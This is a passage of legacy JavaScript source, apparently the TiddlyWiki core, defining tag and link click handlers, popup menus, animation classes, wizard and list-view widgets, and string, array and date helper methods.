		fields = theLink.getAttribute("tiddlyFields");
		noToggle = theLink.getAttribute("noToggle");
		theLink = theLink.parentNode;
	} while(title == null && theLink != null);
	if(!fields && !store.isShadowTiddler(title))
		fields = String.encodeHashMap(config.defaultCustomFields);
	if(title) {
		var toggling = e.metaKey || e.ctrlKey;
		if(config.options.chkToggleLinks)
			toggling = !toggling;
		if(noToggle)
			toggling = false;
		story.displayTiddler(theTarget,title,null,true,null,fields,toggling);
	}
	clearMessage();
	return false;
}

// Create a button for a tag with a popup listing all the tiddlers that it tags
function createTagButton(place,tag,excludeTiddler)
{
	var theTag = createTiddlyButton(place,tag,config.views.wikified.tag.tooltip.format([tag]),onClickTag);
	theTag.setAttribute("tag",tag);
	if(excludeTiddler)
		theTag.setAttribute("tiddler",excludeTiddler);
	return theTag;
}

// Event handler for clicking on a tiddler tag
function onClickTag(e)
{
	if(!e) var e = window.event;
	var theTarget = resolveTarget(e);
	var popup = Popup.create(this);
	var tag = this.getAttribute("tag");
	var title = this.getAttribute("tiddler");
	if(popup && tag) {
		var tagged = store.getTaggedTiddlers(tag);
		var titles = [];
		var li,r;
		for(r=0;r<tagged.length;r++) {
			if(tagged[r].title != title)
				titles.push(tagged[r].title);
		}
		var lingo = config.views.wikified.tag;
		if(titles.length > 0) {
			var openAll = createTiddlyButton(createTiddlyElement(popup,"li"),lingo.openAllText.format([tag]),lingo.openAllTooltip,onClickTagOpenAll);
			openAll.setAttribute("tag",tag);
			createTiddlyElement(createTiddlyElement(popup,"li",null,"listBreak"),"div");
			for(r=0; r<titles.length; r++) {
				createTiddlyLink(createTiddlyElement(popup,"li"),titles[r],true);
			}
		} else {
			createTiddlyText(createTiddlyElement(popup,"li",null,"disabled"),lingo.popupNone.format([tag]));
		}
		createTiddlyElement(createTiddlyElement(popup,"li",null,"listBreak"),"div");
		var h = createTiddlyLink(createTiddlyElement(popup,"li"),tag,false);
		createTiddlyText(h,lingo.openTag.format([tag]));
	}
	Popup.show();
	e.cancelBubble = true;
	if(e.stopPropagation) e.stopPropagation();
	return false;
}

// Event handler for 'open all' on a tiddler popup
function onClickTagOpenAll(e)
{
	if(!e) var e = window.event;
	var tag = this.getAttribute("tag");
	var tagged = store.getTaggedTiddlers(tag);
	var titles = [];
	for(var t=0; t<tagged.length; t++)
		titles.push(tagged[t].title);
	story.displayTiddlers(this,titles);
	return false;
}

function onClickError(e)
{
	if(!e) var e = window.event;
	var popup = Popup.create(this);
	var lines = this.getAttribute("errorText").split("\n");
	for(var t=0; t<lines.length; t++)
		createTiddlyElement(popup,"li",null,null,lines[t]);
	Popup.show();
	e.cancelBubble = true;
	if(e.stopPropagation) e.stopPropagation();
	return false;
}

function createTiddlyDropDown(place,onchange,options,defaultValue)
{
	var sel = createTiddlyElement(place,"select");
	sel.onchange = onchange;
	for(var t=0; t<options.length; t++) {
		var e = createTiddlyElement(sel,"option",null,null,options[t].caption);
		e.value = options[t].name;
		if(options[t].name == defaultValue)
			e.selected = true;
	}
	return sel;
}

function createTiddlyPopup(place,caption,tooltip,tiddler)
{
	if(tiddler.text) {
		createTiddlyLink(place,caption,true);
		var btn = createTiddlyButton(place,glyph("downArrow"),tooltip,onClickTiddlyPopup,"tiddlerPopupButton");
		btn.tiddler = tiddler;
	} else {
		createTiddlyText(place,caption);
	}
}

function onClickTiddlyPopup(e)
{
	if(!e) var e = window.event;
	var tiddler = this.tiddler;
	if(tiddler.text) {
		var popup = Popup.create(this,"div","popupTiddler");
		wikify(tiddler.text,popup,null,tiddler);
		Popup.show();
	}
	if(e) e.cancelBubble = true;
	if(e && e.stopPropagation) e.stopPropagation();
	return false;
}

function createTiddlyError(place,title,text)
{
	var btn = createTiddlyButton(place,title,null,onClickError,"errorButton");
	if(text) btn.setAttribute("errorText",text);
}

function merge(dst,src,preserveExisting)
{
	for(p in src) {
		if(!preserveExisting || dst[p] === undefined)
			dst[p] = src[p];
	}
	return dst;
}

// Returns a string containing the description of an exception, optionally prepended by a message
function exceptionText(e,message)
{
	var s = e.description ? e.description : e.toString();
	return message ? "%0:\n%1".format([message,s]) : s;
}

// Displays an alert of an exception description with optional message
function showException(e,message)
{
	alert(exceptionText(e,message));
}

function alertAndThrow(m)
{
	alert(m);
	throw(m);
}

function glyph(name)
{
	var g = config.glyphs;
	var b = g.currBrowser;
	if(b == null) {
		b = 0;
		while(!g.browsers[b]() && b < g.browsers.length-1)
			b++;
		g.currBrowser = b;
	}
	if(!g.codes[name])
		return "";
	return g.codes[name][b];
}
//-
//- Animation engine
//-

function Animator()
{
	this.running = 0; // Incremented at start of each animation, decremented afterwards. If zero, the interval timer is disabled
	this.timerID = 0; // ID of the timer used for animating
	this.animations = []; // List of animations in progress
	return this;
}

// Start animation engine
Animator.prototype.startAnimating = function() // Variable number of arguments
{
	for(var t=0; t<arguments.length; t++)
		this.animations.push(arguments[t]);
	if(this.running == 0) {
		var me = this;
		this.timerID = window.setInterval(function() {me.doAnimate(me);},10);
	}
	this.running += arguments.length;
};

// Perform an animation engine tick, calling each of the known animation modules
Animator.prototype.doAnimate = function(me)
{
	var a = 0;
	while(a < me.animations.length) {
		var animation = me.animations[a];
		if(animation.tick()) {
			a++;
		} else {
			me.animations.splice(a,1);
			if(--me.running == 0)
				window.clearInterval(me.timerID);
		}
	}
};

// Map a 0..1 value to 0..1, but slow down at the start and end
Animator.slowInSlowOut = function(progress)
{
	return(1-((Math.cos(progress * Math.PI)+1)/2));
};

//--
//-- Morpher animation
//--

// Animate a set of properties of an element
function Morpher(element,duration,properties,callback)
{
	this.element = element;
	this.duration = duration;
	this.properties = properties;
	this.startTime = new Date();
	this.endTime = Number(this.startTime) + duration;
	this.callback = callback;
	this.tick();
	return this;
}

Morpher.prototype.assignStyle = function(element,style,value)
{
	switch(style) {
		case "-tw-vertScroll":
			window.scrollTo(findScrollX(),value);
			break;
		case "-tw-horizScroll":
			window.scrollTo(value,findScrollY());
			break;
		default:
			element.style[style] = value;
			break;
	}
};

Morpher.prototype.stop = function()
{
	for(var t=0; t<this.properties.length; t++) {
		var p = this.properties[t];
		if(p.atEnd !== undefined) {
			this.assignStyle(this.element,p.style,p.atEnd);
		}
	}
	if(this.callback)
		this.callback(this.element,this.properties);
};

Morpher.prototype.tick = function()
{
	var currTime = Number(new Date());
	progress = Animator.slowInSlowOut(Math.min(1,(currTime-this.startTime)/this.duration));
	for(var t=0; t<this.properties.length; t++) {
		var p = this.properties[t];
		if(p.start !== undefined && p.end !== undefined) {
			var template = p.template ? p.template : "%0";
			switch(p.format) {
				case undefined:
				case "style":
					var v = p.start + (p.end-p.start) * progress;
					this.assignStyle(this.element,p.style,template.format([v]));
					break;
				case "color":
					break;
			}
		}
	}
	if(currTime >= this.endTime) {
		this.stop();
		return false;
	}
	return true;
};

//--
//-- Zoomer animation
//--

function Zoomer(text,startElement,targetElement,unused)
{
	var e = createTiddlyElement(document.body,"div",null,"zoomer");
	createTiddlyElement(e,"div",null,null,text);
	var winWidth = findWindowWidth();
	var winHeight = findWindowHeight();
	var p = [
		{style: 'left', start: findPosX(startElement), end: findPosX(targetElement), template: '%0px'},
		{style: 'top', start: findPosY(startElement), end: findPosY(targetElement), template: '%0px'},
		{style: 'width', start: Math.min(startElement.scrollWidth,winWidth), end: Math.min(targetElement.scrollWidth,winWidth), template: '%0px', atEnd: 'auto'},
		{style: 'height', start: Math.min(startElement.scrollHeight,winHeight), end: Math.min(targetElement.scrollHeight,winHeight), template: '%0px', atEnd: 'auto'},
		{style: 'fontSize', start: 8, end: 24, template: '%0pt'}
	];
	var c = function(element,properties) {removeNode(element);};
	return new Morpher(e,config.animDuration,p,c);
}

//--
//-- Scroller animation
//--

function Scroller(targetElement,unused)
{
	var p = [
		{style: '-tw-vertScroll', start: findScrollY(), end: ensureVisible(targetElement)}
	];
	return new Morpher(targetElement,config.animDuration,p);
}

//--
//-- Slider animation
//--

// deleteMode - "none", "all" [delete target element and it's children], [only] "children" [but not the target element]
function Slider(element,opening,unused,deleteMode)
{
	element.style.overflow = 'hidden';
	if(opening)
		element.style.height = '0px'; // Resolves a Firefox flashing bug
	element.style.display = 'block';
	var left = findPosX(element);
	var width = element.scrollWidth;
	var height = element.scrollHeight;
	var winWidth = findWindowWidth();
	var p = [];
	var c = null;
	if(opening) {
		p.push({style: 'height', start: 0, end: height, template: '%0px', atEnd: 'auto'});
		p.push({style: 'opacity', start: 0, end: 1, template: '%0'});
		p.push({style: 'filter', start: 0, end: 100, template: 'alpha(opacity:%0)'});
	} else {
		p.push({style: 'height', start: height, end: 0, template: '%0px'});
		p.push({style: 'display', atEnd: 'none'});
		p.push({style: 'opacity', start: 1, end: 0, template: '%0'});
		p.push({style: 'filter', start: 100, end: 0, template: 'alpha(opacity:%0)'});
		switch(deleteMode) {
			case "all":
				c = function(element,properties) {removeNode(element);};
				break;
			case "children":
				c = function(element,properties) {removeChildren(element);};
				break;
		}
	}
	return new Morpher(element,config.animDuration,p,c);
}

//--
//-- Popup menu
//--

var Popup = {
	stack: [] // Array of objects with members root: and popup:
	};

Popup.create = function(root,elem,theClass)
{
	Popup.remove();
	var popup = createTiddlyElement(document.body,elem ? elem : "ol","popup",theClass ? theClass : "popup");
	Popup.stack.push({root: root, popup: popup});
	return popup;
};

Popup.onDocumentClick = function(e)
{
	if (!e) var e = window.event;
	var target = resolveTarget(e);
	if(e.eventPhase == undefined)
		Popup.remove();
	else if(e.eventPhase == Event.BUBBLING_PHASE || e.eventPhase == Event.AT_TARGET)
		Popup.remove();
	return true;
};

Popup.show = function(unused1,unused2)
{
	var curr = Popup.stack[Popup.stack.length-1];
	this.place(curr.root,curr.popup);
	addClass(curr.root,"highlight");
	if(config.options.chkAnimate && anim && typeof Scroller == "function")
		anim.startAnimating(new Scroller(curr.popup));
	else
		window.scrollTo(0,ensureVisible(curr.popup));
};

Popup.place = function(root,popup,offset)
{
	if(!offset) var offset = {x:0, y:0};
	var rootLeft = findPosX(root);
	var rootTop = findPosY(root);
	var rootHeight = root.offsetHeight;
	var popupLeft = rootLeft + offset.x;
	var popupTop = rootTop + rootHeight + offset.y;
	var winWidth = findWindowWidth();
	if(popup.offsetWidth > winWidth*0.75)
		popup.style.width = winWidth*0.75 + "px";
	var popupWidth = popup.offsetWidth;
	if(popupLeft + popupWidth > winWidth)
		popupLeft = winWidth - popupWidth;
	popup.style.left = popupLeft + "px";
	popup.style.top = popupTop + "px";
	popup.style.display = "block";
}

Popup.remove = function()
{
	if(Popup.stack.length > 0) {
		Popup.removeFrom(0);
	}
};

Popup.removeFrom = function(from)
{
	for(var t=Popup.stack.length-1; t>=from; t--) {
		var p = Popup.stack[t];
		removeClass(p.root,"highlight");
		removeNode(p.popup);
	}
	Popup.stack = Popup.stack.slice(0,from);
};

//--
//-- Wizard support
//--

function Wizard(elem)
{
	if(elem) {
		this.formElem = findRelated(elem,"wizard","className");
		this.bodyElem = findRelated(this.formElem.firstChild,"wizardBody","className","nextSibling");
		this.footElem = findRelated(this.formElem.firstChild,"wizardFooter","className","nextSibling");
	} else {
		this.formElem = null;
		this.bodyElem = null;
		this.footElem = null;
	}
}

Wizard.prototype.setValue = function(name,value)
{
	if(this.formElem)
		this.formElem[name] = value;
};

Wizard.prototype.getValue = function(name)
{
	return this.formElem ? this.formElem[name] : null;
};

Wizard.prototype.createWizard = function(place,title)
{
	this.formElem = createTiddlyElement(place,"form",null,"wizard");
	createTiddlyElement(this.formElem,"h1",null,null,title);
	this.bodyElem = createTiddlyElement(this.formElem,"div",null,"wizardBody");
	this.footElem = createTiddlyElement(this.formElem,"div",null,"wizardFooter");
};

Wizard.prototype.clear = function()
{
	removeChildren(this.bodyElem);
};

Wizard.prototype.setButtons = function(buttonInfo,status)
{
	removeChildren(this.footElem);
	for(var t=0; t<buttonInfo.length; t++) {
		createTiddlyButton(this.footElem,buttonInfo[t].caption,buttonInfo[t].tooltip,buttonInfo[t].onClick);
		insertSpacer(this.footElem);
		}
	if(typeof status == "string") {
		createTiddlyElement(this.footElem,"span",null,"status",status);
	}
};

Wizard.prototype.addStep = function(stepTitle,html)
{
	removeChildren(this.bodyElem);
	var w = createTiddlyElement(this.bodyElem,"div");
	createTiddlyElement(w,"h2",null,null,stepTitle);
	var step = createTiddlyElement(w,"div",null,"wizardStep");
	step.innerHTML = html;
	applyHtmlMacros(step,tiddler);
};

Wizard.prototype.getElement = function(name)
{
	return this.formElem.elements[name];
};

//--
//-- ListView gadget
//--

var ListView = {};

// Create a listview
ListView.create = function(place,listObject,listTemplate,callback,className)
{
	var table = createTiddlyElement(place,"table",null,className ? className : "listView twtable");
	var thead = createTiddlyElement(table,"thead");
	var r = createTiddlyElement(thead,"tr");
	for(var t=0; t<listTemplate.columns.length; t++) {
		var columnTemplate = listTemplate.columns[t];
		var c = createTiddlyElement(r,"th");
		var colType = ListView.columnTypes[columnTemplate.type];
		if(colType && colType.createHeader)
			colType.createHeader(c,columnTemplate,t);
	}
	var tbody = createTiddlyElement(table,"tbody");
	for(var rc=0; rc<listObject.length; rc++) {
		rowObject = listObject[rc];
		r = createTiddlyElement(tbody,"tr");
		for(c=0; c<listTemplate.rowClasses.length; c++) {
			if(rowObject[listTemplate.rowClasses[c].field])
				addClass(r,listTemplate.rowClasses[c].className);
		}
		rowObject.rowElement = r;
		rowObject.colElements = {};
		for(var cc=0; cc<listTemplate.columns.length; cc++) {
			c = createTiddlyElement(r,"td");
			columnTemplate = listTemplate.columns[cc];
			var field = columnTemplate.field;
			colType = ListView.columnTypes[columnTemplate.type];
			if(colType && colType.createItem)
				colType.createItem(c,rowObject,field,columnTemplate,cc,rc);
			rowObject.colElements[field] = c;
		}
	}
	if(callback && listTemplate.actions)
		createTiddlyDropDown(place,ListView.getCommandHandler(callback),listTemplate.actions);
	if(callback && listTemplate.buttons) {
		for(t=0; t<listTemplate.buttons.length; t++) {
			var a = listTemplate.buttons[t];
			if(a && a.name != "")
				createTiddlyButton(place,a.caption,null,ListView.getCommandHandler(callback,a.name,a.allowEmptySelection));
		}
	}
	return table;
};

ListView.getCommandHandler = function(callback,name,allowEmptySelection)
{
	return function(e) {
		var view = findRelated(this,"TABLE",null,"previousSibling");
		var tiddlers = [];
		ListView.forEachSelector(view,function(e,rowName) {
					if(e.checked)
						tiddlers.push(rowName);
					});
		if(tiddlers.length == 0 && !allowEmptySelection) {
			alert(config.messages.nothingSelected);
		} else {
			if(this.nodeName.toLowerCase() == "select") {
				callback(view,this.value,tiddlers);
				this.selectedIndex = 0;
			} else {
				callback(view,name,tiddlers);
			}
		}
	};
};

// Invoke a callback for each selector checkbox in the listview
ListView.forEachSelector = function(view,callback)
{
	var checkboxes = view.getElementsByTagName("input");
	var hadOne = false;
	for(var t=0; t<checkboxes.length; t++) {
		var cb = checkboxes[t];
		if(cb.getAttribute("type") == "checkbox") {
			var rn = cb.getAttribute("rowName");
			if(rn) {
				callback(cb,rn);
				hadOne = true;
			}
		}
	}
	return hadOne;
};

ListView.getSelectedRows = function(view)
{
	var rowNames = [];
	ListView.forEachSelector(view,function(e,rowName) {
				if(e.checked)
					rowNames.push(rowName);
				});
	return rowNames;
};

ListView.columnTypes = {};

ListView.columnTypes.String = {
	createHeader: function(place,columnTemplate,col)
		{
			createTiddlyText(place,columnTemplate.title);
		},
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			if(v != undefined)
				createTiddlyText(place,v);
		}
};

ListView.columnTypes.WikiText = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			if(v != undefined)
				wikify(v,place,null,null);
		}
};

ListView.columnTypes.Tiddler = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			if(v != undefined && v.title)
				createTiddlyPopup(place,v.title,config.messages.listView.tiddlerTooltip,v);
		}
};

ListView.columnTypes.Size = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			if(v != undefined) {
				var t = 0;
				while(t<config.messages.sizeTemplates.length-1 && v<config.messages.sizeTemplates[t].unit)
					t++;
				createTiddlyText(place,config.messages.sizeTemplates[t].template.format([Math.round(v/config.messages.sizeTemplates[t].unit)]));
			}
		}
};

ListView.columnTypes.Link = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			var c = columnTemplate.text;
			if(v != undefined)
				createTiddlyText(createExternalLink(place,v),c ? c : v);
		}
};

ListView.columnTypes.Date = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			if(v != undefined)
				createTiddlyText(place,v.formatString(columnTemplate.dateFormat));
		}
};

ListView.columnTypes.StringList = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			if(v != undefined) {
				for(var t=0; t<v.length; t++) {
					createTiddlyText(place,v[t]);
					createTiddlyElement(place,"br");
				}
			}
		}
};

ListView.columnTypes.Selector = {
	createHeader: function(place,columnTemplate,col)
		{
			createTiddlyCheckbox(place,null,false,this.onHeaderChange);
		},
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var e = createTiddlyCheckbox(place,null,listObject[field],null);
			e.setAttribute("rowName",listObject[columnTemplate.rowName]);
		},
	onHeaderChange: function(e)
		{
			var state = this.checked;
			var view = findRelated(this,"TABLE");
			if(!view)
				return;
			ListView.forEachSelector(view,function(e,rowName) {
								e.checked = state;
							});
		}
};

ListView.columnTypes.Tags = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var tags = listObject[field];
			createTiddlyText(place,String.encodeTiddlyLinkList(tags));
		}
};

ListView.columnTypes.Boolean = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			if(listObject[field] == true)
				createTiddlyText(place,columnTemplate.trueText);
			if(listObject[field] == false)
				createTiddlyText(place,columnTemplate.falseText);
		}
};

ListView.columnTypes.TagCheckbox = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var e = createTiddlyCheckbox(place,null,listObject[field],this.onChange);
			e.setAttribute("tiddler",listObject.title);
			e.setAttribute("tag",columnTemplate.tag);
		},
	onChange : function(e)
		{
			var tag = this.getAttribute("tag");
			var tiddler = this.getAttribute("tiddler");
			store.setTiddlerTag(tiddler,this.checked,tag);
		}
};

ListView.columnTypes.TiddlerLink = {
	createHeader: ListView.columnTypes.String.createHeader,
	createItem: function(place,listObject,field,columnTemplate,col,row)
		{
			var v = listObject[field];
			if(v != undefined) {
				var link = createTiddlyLink(place,listObject[columnTemplate.tiddlerLink],false,null);
				createTiddlyText(link,listObject[field]);
			}
		}
};

//--
//-- Augmented methods for the JavaScript Number(), Array(), String() and Date() objects
//--

// Clamp a number to a range
Number.prototype.clamp = function(min,max)
{
	var c = this;
	if(c < min)
		c = min;
	if(c > max)
		c = max;
	return c;
};

// Add indexOf function if browser does not support it
if(!Array.indexOf) {
Array.prototype.indexOf = function(item,from)
{
	if(!from)
		from = 0;
	for(var i=from; i<this.length; i++) {
		if(this[i] === item)
			return i;
	}
	return -1;
};}

// Find an entry in a given field of the members of an array
Array.prototype.findByField = function(field,value)
{
	for(var t=0; t<this.length; t++) {
		if(this[t][field] == value)
			return t;
	}
	return null;
};

// Return whether an entry exists in an array
Array.prototype.contains = function(item)
{
	return this.indexOf(item) != -1;
};

// Adds, removes or toggles a particular value within an array
//  value - value to add
//  mode - +1 to add value, -1 to remove value, 0 to toggle it
Array.prototype.setItem = function(value,mode)
{
	var p = this.indexOf(value);
	if(mode == 0)
		mode = (p == -1) ? +1 : -1;
	if(mode == +1) {
		if(p == -1)
			this.push(value);
	} else if(mode == -1) {
		if(p != -1)
			this.splice(p,1);
	}
};

// Return whether one of a list of values exists in an array
Array.prototype.containsAny = function(items)
{
	for(var i=0; i<items.length; i++) {
		if (this.indexOf(items[i]) != -1)
			return true;
	}
	return false;
};

// Return whether all of a list of values exists in an array
Array.prototype.containsAll = function(items)
{
	for (var i = 0; i<items.length; i++) {
		if (this.indexOf(items[i]) == -1)
			return false;
	}
	return true;
};

// Push a new value into an array only if it is not already present in the array. If the optional unique parameter is false, it reverts to a normal push
Array.prototype.pushUnique = function(item,unique)
{
	if(unique === false) {
		this.push(item);
	} else {
		if(this.indexOf(item) == -1)
			this.push(item);
	}
};

Array.prototype.remove = function(item)
{
	var p = this.indexOf(item);
	if(p != -1)
		this.splice(p,1);
};

// Get characters from the right end of a string
String.prototype.right = function(n)
{
	return n < this.length ? this.slice(this.length-n) : this;
};

// Trim whitespace from both ends of a string
String.prototype.trim = function()
{
	return this.replace(/^\s*|\s*$/g,"");
};

// Convert a string from a CSS style property name to a JavaScript style name ("background-color" -> "backgroundColor")
String.prototype.unDash = function()
{
	var s = this.split("-");
	if(s.length > 1) {
		for(var t=1; t<s.length; t++)
			s[t] = s[t].substr(0,1).toUpperCase() + s[t].substr(1);
	}
	return s.join("");
};

// Substitute substrings from an array into a format string that includes '%1'-type specifiers
String.prototype.format = function(substrings)
{
	var subRegExp = /(?:%(\d+))/mg;
	var currPos = 0;
	var r = [];
	do {
		var match = subRegExp.exec(this);
		if(match && match[1]) {
			if(match.index > currPos)
				r.push(this.substring(currPos,match.index));
			r.push(substrings[parseInt(match[1])]);
			currPos = subRegExp.lastIndex;
		}
	} while(match);
	if(currPos < this.length)
		r.push(this.substring(currPos,this.length));
	return r.join("");
};

// Escape any special RegExp characters with that character preceded by a backslash
String.prototype.escapeRegExp = function()
{
	var s = "\\^$*+?()=!|,{}[].";
	var c = this;
	for(var t=0; t<s.length; t++)
		c = c.replace(new RegExp("\\" + s.substr(t,1),"g"),"\\" + s.substr(t,1));
	return c;
};

// Convert "\" to "\s", newlines to "\n" (and remove carriage returns)
String.prototype.escapeLineBreaks = function()
{
	return this.replace(/\\/mg,"\\s").replace(/\n/mg,"\\n").replace(/\r/mg,"");
};

// Convert "\n" to newlines, "\b" to " ", "\s" to "\" (and remove carriage returns)
String.prototype.unescapeLineBreaks = function()
{
	return this.replace(/\\n/mg,"\n").replace(/\\b/mg," ").replace(/\\s/mg,"\\").replace(/\r/mg,"");
};

// Convert & to "&amp;", < to "&lt;", > to "&gt;" and " to "&quot;"
String.prototype.htmlEncode = function()
{
	return this.replace(/&/mg,"&amp;").replace(/</mg,"&lt;").replace(/>/mg,"&gt;").replace(/\"/mg,"&quot;");
};

// Convert "&amp;" to &, "&lt;" to <, "&gt;" to > and "&quot;" to "
String.prototype.htmlDecode = function()
{
	return this.replace(/&lt;/mg,"<").replace(/&gt;/mg,">").replace(/&quot;/mg,"\"").replace(/&amp;/mg,"&");
};

// Convert a string to it's JSON representation by encoding control characters, double quotes and backslash. See json.org
String.prototype.toJSONString = function()
{
	var m = {
		'\b': '\\b',
		'\f': '\\f',
		'\n': '\\n',
		'\r': '\\r',
		'\t': '\\t',
		'"' : '\\"',
		'\\': '\\\\'
		};
	var replaceFn = function(a,b) {
		var c = m[b];
		if(c)
			return c;
		c = b.charCodeAt();
		return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
		};
	if(/["\\\x00-\x1f]/.test(this))
		return '"' + this.replace(/([\x00-\x1f\\"])/g,replaceFn) + '"';
	return '"' + this + '"';
};

// Parse a space-separated string of name:value parameters
// The result is an array of objects:
//   result[0] = object with a member for each parameter name, value of that member being an array of values
//   result[1..n] = one object for each parameter, with 'name' and 'value' members
String.prototype.parseParams = function(defaultName,defaultValue,allowEval,noNames,cascadeDefaults)
{
	var parseToken = function(match,p) {
		var n;
		if(match[p]) // Double quoted
			n = match[p];
		else if(match[p+1]) // Single quoted
			n = match[p+1];
		else if(match[p+2]) // Double-square-bracket quoted
			n = match[p+2];
		else if(match[p+3]) // Double-brace quoted
			try {
				n = match[p+3];
				if(allowEval)
					n = window.eval(n);
			} catch(ex) {
				throw "Unable to evaluate {{" + match[p+3] + "}}: " + exceptionText(ex);
			}
		else if(match[p+4]) // Unquoted
			n = match[p+4];
		else if(match[p+5]) // empty quote
			n = "";
		return n;
	};
	var r = [{}];
	var dblQuote = "(?:\"((?:(?:\\\\\")|[^\"])+)\")";
	var sngQuote = "(?:'((?:(?:\\\\\')|[^'])+)')";
	var dblSquare = "(?:\\[\\[((?:\\s|\\S)*?)\\]\\])";
	var dblBrace = "(?:\\{\\{((?:\\s|\\S)*?)\\}\\})";
	var unQuoted = noNames ? "([^\"'\\s]\\S*)" : "([^\"':\\s][^\\s:]*)";
	var emptyQuote = "((?:\"\")|(?:''))";
	var skipSpace = "(?:\\s*)";
	var token = "(?:" + dblQuote + "|" + sngQuote + "|" + dblSquare + "|" + dblBrace + "|" + unQuoted + "|" + emptyQuote + ")";
	var re = noNames ? new RegExp(token,"mg") : new RegExp(skipSpace + token + skipSpace + "(?:(\\:)" + skipSpace + token + ")?","mg");
	var params = [];
	do {
		var match = re.exec(this);
		if(match) {
			var n = parseToken(match,1);
			if(noNames) {
				r.push({name:"",value:n});
			} else {
				var v = parseToken(match,8);
				if(v == null && defaultName) {
					v = n;
					n = defaultName;
				} else if(v == null && defaultValue) {
					v = defaultValue;
				}
				r.push({name:n,value:v});
				if(cascadeDefaults) {
					defaultName = n;
					defaultValue = v;
				}
			}
		}
	} while(match);
	// Summarise parameters into first element
	for(var t=1; t<r.length; t++) {
		if(r[0][r[t].name])
			r[0][r[t].name].push(r[t].value);
		else
			r[0][r[t].name] = [r[t].value];
	}
	return r;
};

// Process a string list of macro parameters into an array. Parameters can be quoted with "", '',
// [[]], {{ }} or left unquoted (and therefore space-separated). Double-braces {{}} results in
// an *evaluated* parameter: e.g. {{config.options.txtUserName}} results in the current user's name.
String.prototype.readMacroParams = function()
{
	var p = this.parseParams("list",null,true,true);
	var n = [];
	for(var t=1; t<p.length; t++)
		n.push(p[t].value);
	return n;
};

// Process a string list of unique tiddler names into an array. Tiddler names that have spaces in them must be [[bracketed]]
String.prototype.readBracketedList = function(unique)
{
	var p = this.parseParams("list",null,false,true);
	var n = [];
	for(var t=1; t<p.length; t++)
		n.pushUnique(p[t].value,unique);
	return n;
};

// Returns array with start and end index of chunk between given start and end marker, or undefined.
String.prototype.getChunkRange = function(start,end) 
{
	var s = this.indexOf(start);
	if(s != -1) {
		s += start.length;
		var e = this.indexOf(end,s);
		if(e != -1)
			return [s,e];
	}
};

// Replace a chunk of a string given start and end markers
String.prototype.replaceChunk = function(start,end,sub)
{
	var r = this.getChunkRange(start,end);
	return r ? this.substring(0,r[0]) + sub + this.substring(r[1]) : this;
};

// Returns a chunk of a string between start and end markers, or undefined
String.prototype.getChunk = function(start,end)
{
	var r = this.getChunkRange(start,end);
	if(r)
		return this.substring(r[0],r[1]);
};


// Static method to bracket a string with double square brackets if it contains a space
String.encodeTiddlyLink = function(title)
{
	return title.indexOf(" ") == -1 ? title : "[[" + title + "]]";
};

// Static method to encodeTiddlyLink for every item in an array and join them with spaces
String.encodeTiddlyLinkList = function(list)
{
	if(list) {
		var results = [];
		for(var t=0; t<list.length; t++)
			results.push(String.encodeTiddlyLink(list[t]));
		return results.join(" ");
	} else {
		return "";
	}
};

// Convert a string as a sequence of name:"value" pairs into a hashmap
String.prototype.decodeHashMap = function()
{
	var fields = this.parseParams("anon","",false);
	var r = {};
	for(var t=1; t<fields.length; t++)
		r[fields[t].name] = fields[t].value;
	return r;
};

// Static method to encode a hashmap into a name:"value"... string
String.encodeHashMap = function(hashmap)
{
	var r = [];
	for(var t in hashmap)
		r.push(t + ':"' + hashmap[t] + '"');
	return r.join(" ");
};

// Static method to left-pad a string with 0s to a certain width
String.zeroPad = function(n,d)
{
	var s = n.toString();
	if(s.length < d)
		s = "000000000000000000000000000".substr(0,d-s.length) + s;
	return s;
};

String.prototype.startsWith = function(prefix) 
{
	return !prefix || this.substring(0,prefix.length) == prefix;
};

// Returns the first value of the given named parameter.
function getParam(params,name,defaultValue)
{
	if(!params)
		return defaultValue;
	var p = params[0][name];
	return p ? p[0] : defaultValue;
}

// Returns the first value of the given boolean named parameter.
function getFlag(params,name,defaultValue)
{
	return !!getParam(params,name,defaultValue);
}

// Substitute date components into a string
Date.prototype.formatString = function(template)
{
	var t = template.replace(/0hh12/g,String.zeroPad(this.getHours12(),2));
	t = t.replace(/hh12/g,this.getHours12());
	t = t.replace(/0hh/g,String.zeroPad(this.getHours(),2));
	t = t.replace(/hh/g,this.getHours());
	t = t.replace(/mmm/g,config.messages.dates.shortMonths[this.getMonth()]);
	t = t.replace(/0mm/g,String.zeroPad(this.getMinutes(),2));
	t = t.replace(/mm/g,this.getMinutes());
	t = t.replace(/0ss/g,String.zeroPad(this.getSeconds(),2));
	t = t.replace(/ss/g,this.getSeconds());
	t = t.replace(/[ap]m/g,this.getAmPm().toLowerCase());
	t = t.replace(/[AP]M/g,this.getAmPm().toUpperCase());
	t = t.replace(/wYYYY/g,this.getYearForWeekNo());
	t = t.replace(/wYY/g,String.zeroPad(this.getYearForWeekNo()-2000,2));
	t = t.replace(/YYYY/g,this.getFullYear());
	t = t.replace(/YY/g,String.zeroPad(this.getFullYear()-2000,2));
	t = t.replace(/MMM/g,config.messages.dates.months[this.getMonth()]);
	t = t.replace(/0MM/g,String.zeroPad(this.getMonth()+1,2));
	t = t.replace(/MM/g,this.getMonth()+1);
	t = t.replace(/0WW/g,String.zeroPad(this.getWeek(),2));
	t = t.replace(/WW/g,this.getWeek());
